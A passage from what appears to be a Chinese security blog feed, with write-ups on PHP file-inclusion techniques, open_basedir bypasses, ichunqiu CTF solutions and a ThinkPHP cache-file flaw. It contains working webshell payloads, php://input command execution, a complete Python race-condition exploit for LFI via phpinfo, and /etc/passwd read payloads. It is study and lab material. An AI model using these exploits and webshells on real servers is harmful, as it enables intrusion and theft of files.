class="hljs-regexp">/:/</span>tmpallow_url_include关闭，其实这里也用不了伪协议，做了限制．disbale_functions未做限制</code></pre><p>文件包含还有个姿势就是利用日志＼临时文件＼session文件写入webshell进行包含．</p><p>phpinfo给了session保存路径/tmp/SESS<br>猜测题目会对session文件写入登录信息，<strong>本地演示</strong>demo如下，写入Webshell.<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>注册账户名<code>&lt;?php eval($_GET[‘a’]);?&gt;</code>无法执行shell．估计被waf了，注册</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $_GET[a](base64_decode($_GET[‘c’]));<span class="hljs-meta">?&gt;</span></code></pre><p>访问：<a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_i8si4g0683pgb2gg9ghi5a7ql4&amp;a=system&amp;c=Y2F0IGZsYWcucGhw" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_i8si4g0683pgb2gg9ghi5a7ql4&amp;a=system&amp;c=Y2F0IGZsYWcucGhw</a><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><p>WEB include</p><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> show_source(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'path'</span>]))&#123;    <span class="hljs-keyword">include</span>($_REQUEST[<span class="hljs-string">'path'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">'phpinfo.php'</span>);&#125;</code></pre><p><strong><a href="https://www.anquanke.com/post/id/177491" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177491</a></strong><br>直接读flag.php无回显，考虑命令执行，使用<code>php://input POSＴ</code>数据</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `cat dle345aae.php`; <span class="hljs-meta">?&gt;</span></span></code></pre><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="LFI-php7崩溃"><a href="#LFI-php7崩溃" class="headerlink" title="LFI+php7崩溃"></a>LFI+php7崩溃</h1><p>当不存在phpinfo界面时，可以利用<code>php7 segment fault</code>特性。<br>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>我们可以利用</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/index.php?file=php:/</span><span class="hljs-regexp">/filter/</span>string.strip_tags=<span class="hljs-regexp">/etc/</span>passwd</code></pre><p>这样的方式，使php执行过程中出现 <strong>Segment Fault</strong>，这样如果在此同时上传文件，那么临时文件就会被保存在<code>/tmp</code>目录，不会被删除：</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>www目录下的文件和内容<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>直接执行报错，触发<code>php7 segment fault</code>特性<br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><p>编写exp，利用www目录下<strong>dir.php</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<span class="hljs-keyword">import</span> refile_data=&#123;<span class="hljs-string">'file'</span>: BytesIO(<span class="hljs-string">"&lt;?php eval($_GET[1]);"</span>)&#125;url=<span class="hljs-string">"http://127.0.0.1:8082/lfi.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span><span class="hljs-keyword">try</span>:r=requests.post(url=url,files=file_data,allow_redirects=<span class="hljs-literal">False</span>)<span class="hljs-keyword">except</span>:url=<span class="hljs-string">"http://127.0.0.1:8082/dir.php"</span>r=requests.get(url)print(r.content)</code></pre><p>包含文件，执行Shell<br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><h1 id="phpinfo缓存文件"><a href="#phpinfo缓存文件" class="headerlink" title="phpinfo缓存文件"></a>phpinfo缓存文件</h1><blockquote><p>当攻击网页时找不到可包含webshell，若网站存在phpinfo();界面，配置信息<code>file_uploads = on。</code><br>可以借助访问phpinfo界面是产生的缓存临时目录写入webshell。</p></blockquote><p>使用py脚本可以抓取缓存文件名，为了阻止php删除缓存过快，添加垃圾信息上传。</p><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<span class="hljs-keyword">import</span> refile_data=&#123;<span class="hljs-string">'file'</span>: BytesIO(<span class="hljs-string">"&lt;?php echo 'test';"</span>)&#125;url=<span class="hljs-string">"http://127.0.0.1:8080/phpinfo.php"</span>r=requests.post(url=url,files=file_data,allow_redirects=<span class="hljs-keyword">False</span>)<span class="hljs-keyword">print</span>(r.content)</code></pre><p>在php删除缓存文件时候成功抓取文件名<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>引用p神分析:<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><blockquote><p>1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据<br>2.因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大<br>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>4.所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包<br>5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除<br>6.利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p></blockquote><p>我们需要在<code>phpinfo</code>产生缓存文件之时并包含，缓存文件内容写入</p><pre><code class="hljs reasonml">&lt;?php file<span class="hljs-constructor">_put_contents('<span class="hljs-operator">/</span><span class="hljs-params">tmp</span><span class="hljs-operator">/</span><span class="hljs-params">od0d</span>', '&lt;?=<span class="hljs-params">eval</span>($<span class="hljs-params">_REQUEST</span>[1])</span>?&gt;')?&gt;</code></pre><p>创建webshell，防止tmp文件被删除。<br>三处圈圈地方根据个人需要进行修改即可<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>执行py脚本<br><img src="./7.png" srcset="/img/loading.gif" alt=""><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>访问：<strong><a href="http://127.0.0.1:8080/lfi.php?file=/tmp/od0d&amp;1=system(&#39;ls&#39;)" target="_blank" rel="noopener">http://127.0.0.1:8080/lfi.php?file=/tmp/od0d&amp;1=system(&#39;ls&#39;)</a>;</strong><br>成功写入webshell<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python </span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> socket<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup</span><span class="hljs-params">(host, port)</span>:</span>    TAG=<span class="hljs-string">"Security Test"</span>    PAYLOAD=<span class="hljs-string">"""%s\r</span><span class="hljs-string">&lt;?php file_put_contents('/tmp/od0d', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG    REQ1_DATA=<span class="hljs-string">"""-----------------------------7dbff1ded0714\r</span><span class="hljs-string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span><span class="hljs-string">Content-Type: text/plain\r</span><span class="hljs-string">\r</span><span class="hljs-string">%s</span><span class="hljs-string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD    padding=<span class="hljs-string">"A"</span> * <span class="hljs-number">5000</span>    REQ1=<span class="hljs-string">"""POST /phpinfo.php?a="""</span>+padding+<span class="hljs-string">""" HTTP/1.1\r</span><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="hljs-string">"""\r</span><span class="hljs-string">HTTP_ACCEPT: """</span> + padding + <span class="hljs-string">"""\r</span><span class="hljs-string">HTTP_USER_AGENT: """</span>+padding+<span class="hljs-string">"""\r</span><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="hljs-string">"""\r</span><span class="hljs-string">HTTP_PRAGMA: """</span>+padding+<span class="hljs-string">"""\r</span><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><span class="hljs-string">Content-Length: %s\r</span><span class="hljs-string">Host: %s\r</span><span class="hljs-string">\r</span><span class="hljs-string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)    <span class="hljs-comment">#modify this to suit the LFI script   </span>    LFIREQ=<span class="hljs-string">"""GET /lfi.php?file=%s HTTP/1.1\r</span><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><span class="hljs-string">Host: %s\r</span><span class="hljs-string">\r</span><span class="hljs-string">\r</span><span class="hljs-string">"""</span>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">phpInfoLFI</span><span class="hljs-params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = <span class="hljs-string">""</span>    <span class="hljs-keyword">while</span> len(d) &lt; offset:        d += s.recv(offset)    <span class="hljs-keyword">try</span>:        i = d.index(<span class="hljs-string">"[tmp_name] =&amp;gt; "</span>)        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]    <span class="hljs-keyword">except</span> ValueError:        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    s2.send(lfireq % (fn, host))    d = s2.recv(<span class="hljs-number">4096</span>)    s.close()    s2.close()    <span class="hljs-keyword">if</span> d.find(tag) != <span class="hljs-number">-1</span>:        <span class="hljs-keyword">return</span> fncounter=<span class="hljs-number">0</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWorker</span><span class="hljs-params">(threading.Thread)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, e, l, m, *args)</span>:</span>        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">global</span> counter        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.event.is_set():            <span class="hljs-keyword">with</span> self.lock:                <span class="hljs-keyword">if</span> counter &gt;= self.maxattempts:                    <span class="hljs-keyword">return</span>                counter+=<span class="hljs-number">1</span>            <span class="hljs-keyword">try</span>:                x = phpInfoLFI(*self.args)                <span class="hljs-keyword">if</span> self.event.is_set():                    <span class="hljs-keyword">break</span>                                <span class="hljs-keyword">if</span> x:                    <span class="hljs-keyword">print</span> <span class="hljs-string">"\nGot it! Shell created in /tmp/g"</span>                    self.event.set()                                <span class="hljs-keyword">except</span> socket.error:                <span class="hljs-keyword">return</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getOffset</span><span class="hljs-params">(host, port, phpinforeq)</span>:</span>    <span class="hljs-string">"""Gets offset of tmp_name in the php output"""</span>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)        d = <span class="hljs-string">""</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        i = s.recv(<span class="hljs-number">4096</span>)        d+=i                <span class="hljs-keyword">if</span> i == <span class="hljs-string">""</span>:            <span class="hljs-keyword">break</span>        <span class="hljs-comment"># detect the final chunk</span>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">"0\r\n\r\n"</span>):            <span class="hljs-keyword">break</span>    s.close()    i = d.find(<span class="hljs-string">"[tmp_name] =&amp;gt; "</span>)    <span class="hljs-keyword">if</span> i == <span class="hljs-number">-1</span>:        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"No php tmp_name in phpinfo output"</span>)        <span class="hljs-keyword">print</span> <span class="hljs-string">"found %s at %i"</span> % (d[i:i+<span class="hljs-number">10</span>],i)    <span class="hljs-comment"># padded up a bit</span>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">"LFI With PHPInfo()"</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">"-="</span> * <span class="hljs-number">30</span>    <span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:        <span class="hljs-keyword">print</span> <span class="hljs-string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="hljs-number">0</span>]        sys.exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">try</span>:        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])    <span class="hljs-keyword">except</span> socket.error, e:        <span class="hljs-keyword">print</span> <span class="hljs-string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="hljs-number">1</span>], e)        sys.exit(<span class="hljs-number">1</span>)    port=<span class="hljs-number">80</span>    <span class="hljs-keyword">try</span>:        port = int(sys.argv[<span class="hljs-number">2</span>])    <span class="hljs-keyword">except</span> IndexError:        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">except</span> ValueError, e:        <span class="hljs-keyword">print</span> <span class="hljs-string">"Error with port %d: %s"</span> % (sys.argv[<span class="hljs-number">2</span>], e)        sys.exit(<span class="hljs-number">1</span>)        poolsz=<span class="hljs-number">10</span>    <span class="hljs-keyword">try</span>:        poolsz = int(sys.argv[<span class="hljs-number">3</span>])    <span class="hljs-keyword">except</span> IndexError:        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">except</span> ValueError, e:        <span class="hljs-keyword">print</span> <span class="hljs-string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="hljs-number">3</span>], e)        sys.exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">print</span> <span class="hljs-string">"Getting initial offset..."</span>,      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = <span class="hljs-number">1000</span>    e = threading.Event()    l = threading.Lock()    <span class="hljs-keyword">print</span> <span class="hljs-string">"Spawning worker pool (%d)..."</span> % poolsz    sys.stdout.flush()    tp = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:        t.start()    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):            <span class="hljs-keyword">if</span> e.is_set():                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">with</span> l:                sys.stdout.write( <span class="hljs-string">"\r% 4d / % 4d"</span> % (counter, maxattempts))                sys.stdout.flush()                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:                    <span class="hljs-keyword">break</span>        <span class="hljs-keyword">print</span>        <span class="hljs-keyword">if</span> e.is_set():            <span class="hljs-keyword">print</span> <span class="hljs-string">"Woot!  \m/"</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">":("</span>    <span class="hljs-keyword">except</span> KeyboardInterrupt:        <span class="hljs-keyword">print</span> <span class="hljs-string">"\nTelling threads to shutdown..."</span>        e.set()        <span class="hljs-keyword">print</span> <span class="hljs-string">"Shuttin' down..."</span>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:        t.join()<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:    main()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>open_basedir代码绕过总结</title>
    <link href="/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <url>/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="chdir-、ini-set-函数组合"><a href="#chdir-、ini-set-函数组合" class="headerlink" title="chdir()、ini_set()函数组合"></a>chdir()、ini_set()函数组合</h1><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs less"><span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);<span class="hljs-selector-tag">system</span>(‘cat ../../../../../etc/passwd’);</code></pre><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="glob-绕过open-basedir"><a href="#glob-绕过open-basedir" class="headerlink" title="glob://绕过open_basedir"></a>glob://绕过open_basedir</h1><p>glob用来筛选目录的伪协议，筛选时不受<code>open_basedir</code>制约．<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p><code>http://127.0.0.1/lfi/basedir.php?a=var_dump(scandir(%22./%22));</code><br>能够访问允许访问的当前目录<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p><code>http://127.0.0.1/lfi/basedir.php?a=var_dump(scandir(%22../../%22));</code><br><strong>无法访问../../超出open_basedir限制范围，访问失败</strong><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p><code>http://127.0.0.1/lfi/basedir.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20{while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20{echo%20%22filename:%22.$file.%22\n%22;}closedir($b);}</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p><code>http://127.0.0.1/lfi/basedir.php?a=system(&#39;cat ../../../../../etc/passwd&#39;);</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://tricking.io/card/28/description" target="_blank" rel="noopener">https://tricking.io/card/28/description</a><br><a href="https://bbs.ichunqiu.com/thread-41397-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-41397-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验吧_web[1]</title>
    <link href="/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/"/>
    <url>/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc-web1"><a href="#Misc-web1" class="headerlink" title="Misc-web1"></a>Misc-web1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>直接看if判断语句<br><code>$_SESSION[&#39;whoami&#39;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0</code><br>md5对数组求解报错，传入<code>value[]=ea</code></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> reurl=<span class="hljs-string">"http://de835d64b7074b5e927755aeac65a2675c25e2c8e7a34779.changame.ichunqiu.com/"</span>params=&#123;<span class="hljs-string">'value[]'</span>:<span class="hljs-string">'ea'</span>&#125;r=requests.session();rep=r.get(url=url,params=params)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):numname=rep.text[<span class="hljs-number">0</span>]+rep.text[<span class="hljs-number">1</span>]params=&#123;<span class="hljs-string">'value[]'</span>:numname&#125;rep=r.get(url=url,params=params)<span class="hljs-keyword">if</span> <span class="hljs-string">'flag&#123;'</span> <span class="hljs-keyword">in</span> rep.text:<span class="hljs-comment">#print(rep.text)</span>print(re.findall(<span class="hljs-string">r"flag&#123;.*&#125;"</span>,rep.text))</code></pre><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="Misc-web2"><a href="#Misc-web2" class="headerlink" title="Misc-web2"></a>Misc-web2</h1><p><code>139a352227524e22b5162381e19ac2f073889c74044b4ba3.changame.ichunqiu.com?hello=highlight_file(&#39;flag.php&#39;)</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p><strong>flag{292328a8-b22f-4e52-b153-33bbebbd7a39}</strong></p><pre><code class="hljs sqf">payload hello=);<span class="hljs-built_in">echo</span> `cat <span class="hljs-built_in">flag</span>.php`;<span class="hljs-comment">//</span>添加`会以shell执行</code></pre><h1 id="MISC-WEB-3"><a href="#MISC-WEB-3" class="headerlink" title="MISC WEB 3"></a>MISC WEB 3</h1><p><strong><a href="http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS" target="_blank" rel="noopener">http://1e07c09258664e849bfee000ce5d813458700a97c465403b.changame.ichunqiu.com/?hello=GLOBALS</a></strong><br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>正则表明只能以数字字母，且var_dump参数存在执行变量．<br><strong>flag{809183e4-0fa2-451f-88c9-2a4745fbedb4}</strong><br>这些超全局变量是：</p><pre><code class="hljs autoit">$GLOBALS、$_SERVER、$_GET、$_POST、$_FILES、$_COOKIE、$_SESSION、$_REQUEST、$_ENV</code></pre><h1 id="web-upload"><a href="#web-upload" class="headerlink" title="web-upload"></a>web-upload</h1><pre><code class="hljs routeros">import requestsimport base64<span class="hljs-attribute">r</span>=requests.session()<span class="hljs-attribute">url</span>=<span class="hljs-string">'http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/'</span><span class="hljs-attribute">rep1</span>=r.get(url=url)<span class="hljs-attribute">decode_flag</span>=base64.b64decode(rep1.headers[<span class="hljs-string">'Flag'</span>])[14:]<span class="hljs-attribute">value</span>=base64.b64decode(decode_flag)data=&#123;<span class="hljs-string">'ichunqiu'</span>:value&#125;<span class="hljs-attribute">rep2</span>=r.post(url=url,data=data)<span class="hljs-builtin-name">print</span>(rep2.text)</code></pre><p>输出-&gt; <strong>Path:3712901a08bb58557943ca31f3487b7d</strong></p><p>网站存在<code>.svn</code>源码泄露<br><strong><a href="http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn/wc.db" target="_blank" rel="noopener">http://b906066f071c4a29a74cbcfbfd5945a3a69a9faddfdf4076.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn/wc.db</a></strong></p><pre><code class="hljs swift"><span class="hljs-type">OK!</span><span class="hljs-type">Congratulations!</span><span class="hljs-type">My</span> username <span class="hljs-keyword">is</span> md5(<span class="hljs-type">HEL1OW10rDEvery0n3</span>):)</code></pre><h2 id="脚本爆破验证码"><a href="#脚本爆破验证码" class="headerlink" title="脚本爆破验证码"></a>脚本爆破验证码</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(s)</span>:</span>    <span class="hljs-keyword">return</span> hashlib.md5(str(s).encode(<span class="hljs-string">'utf-8'</span>)).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(s)</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">99999999</span>):        <span class="hljs-keyword">if</span> md5(i)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]  == str(s):            print(i)            exit(<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:main(<span class="hljs-string">"d91ca7"</span>)</code></pre><p>输入帐号密码进行登录</p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span><span class="hljs-number">8638</span>d5263ab0d3face193725c23ce095<span class="hljs-symbol">password:</span><span class="hljs-number">123456</span><span class="hljs-symbol">capture:</span>xxxx</code></pre><p>执行显示<code>flag</code></p><pre><code class="hljs angelscript">The <span class="hljs-number">7815696</span>ecbf1c96e6894b779456d330e.php:)Welcome <span class="hljs-number">8638</span>d5263ab0d3face193725c23ce095!</code></pre><p>上传文件显示需要jpg格式，00截断无果也无文件包含。fuzz修改后缀名，猜测使用黑名单过滤，使用pht后缀得到Flag.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传如果要求jpg上传，可以先尝试00截断．无果的话，可以使用被忽略的后缀排除是否为黑名单．<br>白名单的话，看是否上传Phar，但必须得有lfi包含漏洞．</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5至3版本文件缓存漏洞</title>
    <link href="/2019/05/09/Thinkphp5-3%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <url>/2019/05/09/Thinkphp5-3%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><strong>ThinkPHP5至3版本</strong>缓存文件函数使用不当</p><h2 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h2><p>注册带有恶意php代码的用户名，登录该用户名<strong>thinkPHP</strong>将登录用户名写入缓存文件并且是以<strong>php</strong>文件形式。<br><strong>/ThinkPHP/Tpl/ThinkPHP.php</strong>设置文件路径</p><h1 id="漏洞流程分析"><a href="#漏洞流程分析" class="headerlink" title="漏洞流程分析"></a>漏洞流程分析</h1><p><strong>/ThinkPHP/Tpl/ThinkPHP.php</strong>设置文件路径<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><strong>convertion.php</strong>下保存数据缓存设置</p><p><code>DATA_CACHE_PREFIX、DATA_CACHE_PATH</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>对传入的文件名执行<code>md5($name)</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>跟进缓存文件操作类<strong>File.class.php</strong><br><code>filename</code>方法返回缓存文件名。<code>file_put_contents</code>写入缓存且$data带有php文件格式。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>回溯查找系统调用<code>set</code>方法文件<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p><strong>/ThinkPHP/functions.php</strong>文件下的<code>S</code>方法调用<code>set</code>方法<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>回溯<code>S</code>方法项目调用，在<strong>Application/Common/Api/UserApi.class.php:49行</strong>Ｓ参数<br><code>‘sys_active_user_list’</code>为文件名<code>$name</code>，<code>$list</code>为写入缓存的内容。<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>文件写入内容<code>$list</code>为从数据库提取的用户名<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>回溯<code>get_username()</code>方法，文件<strong>MemberModel.class.php第88行</strong><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p>登录之后,执行文件缓存流程，缓存文件内容显示如下<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>需要填入换行符才能绕过注释符号<br><code>%aphpinfo();//</code><br>注册与登录分别抓包把<code>%0a</code>解码<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>访问<br><code>http://127.0.0.1/cms/onthink1.0/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>ichunqiu oneThink<br><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/" target="_blank" 